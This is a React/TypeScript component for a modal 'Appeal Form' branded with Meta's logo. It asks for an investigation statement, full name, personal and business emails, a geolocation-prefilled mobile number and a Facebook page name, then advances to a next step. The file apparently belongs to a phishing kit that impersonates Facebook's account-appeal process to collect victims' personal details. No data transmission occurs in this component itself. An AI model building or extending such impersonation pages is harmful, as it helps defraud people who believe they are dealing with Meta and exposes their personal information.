import MetaLogo from '@/assets/images/meta-logo-image.png';
import { useFormStore } from '@/store/store';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import IntlTelInput from 'intl-tel-input/reactWithUtils';
import 'intl-tel-input/styles';
import Image from 'next/image';
import { type ChangeEvent, type FC, type FormEvent, useState } from 'react';

interface FormData {
    information: string;
    fullName: string;
    personalEmail: string;
    businessEmail: string;
    phoneNumber: string;
    facebookPageName: string;
    agreedToTerms: boolean;
}

interface FormField {
    name: keyof Omit<FormData, 'agreedToTerms' | 'phoneNumber'>;
    label: string;
    type: 'text' | 'email' | 'textarea';
}

const FORM_FIELDS: FormField[] = [
    { name: 'information', label: 'Please provide us information that will help us investigate', type: 'textarea' },
    { name: 'fullName', label: 'Full Name', type: 'text' },
    { name: 'personalEmail', label: 'Personal Email', type: 'email' },
    { name: 'businessEmail', label: 'Business Email', type: 'email' },
    { name: 'facebookPageName', label: 'Facebook Page Name', type: 'text' }
];
const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const { setModalOpen, geoInfo } = useFormStore();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const [formData, setFormData] = useState<FormData>({
        information: '',
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        phoneNumber: '',
        facebookPageName: '',
        agreedToTerms: false
    });
    const handleInputChange = (e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value, type } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
        }));
    };

    const handlePhoneChange = (number: string) => {
        setFormData((prev) => ({ ...prev, phoneNumber: number }));
    };

    const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        nextStep();
    };
    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex max-h-[90vh] w-full max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                <div className='mb-2 flex w-full items-center justify-between p-4 pb-0'>
                    <p className='text-2xl font-bold'>Appeal Form</p>
                    <button type='button' onClick={() => setModalOpen(false)} className='h-8 w-8 rounded-full transition-colors hover:bg-[#e2eaf2]' aria-label='Close modal'>
                        <FontAwesomeIcon icon={faXmark} size='xl' />
                    </button>
                </div>

                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-4'>
                    <div className='flex flex-col gap-2 py-2'>
                        {FORM_FIELDS.map((field) => (
                            <div key={field.name}>
                                <p className='font-sans'>{field.label}</p>
                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-[100px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' rows={3} /> : <input name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' />}
                            </div>
                        ))}

                        <p className='font-sans'>Mobile phone number</p>
                        <IntlTelInput
                            initialValue={formData.phoneNumber}
                            onChangeNumber={handlePhoneChange}
                            initOptions={{
                                initialCountry: countryCode as '',
                                separateDialCode: true,
                                strictMode: true,
                                nationalMode: true,
                                autoPlaceholder: 'aggressive',
                                placeholderNumberType: 'MOBILE',
                                countrySearch: false
                            }}
                            inputProps={{
                                name: 'phoneNumber',
                                className: 'h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5'
                            }}
                        />

                        <div className='flex items-center gap-2 pt-2'>
                            <input name='agreedToTerms' type='checkbox' checked={formData.agreedToTerms} onChange={handleInputChange} className='cursor-pointer' />
                            <p className='cursor-pointer'>I agree with Terms of use</p>
                        </div>

                        <button type='submit' className='mt-4 flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700'>
                            Submit
                        </button>
                    </div>
                </form>

                <div className='flex items-center justify-center p-3'>
                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
                </div>
            </div>
        </div>
    );
};

export default InitModal;
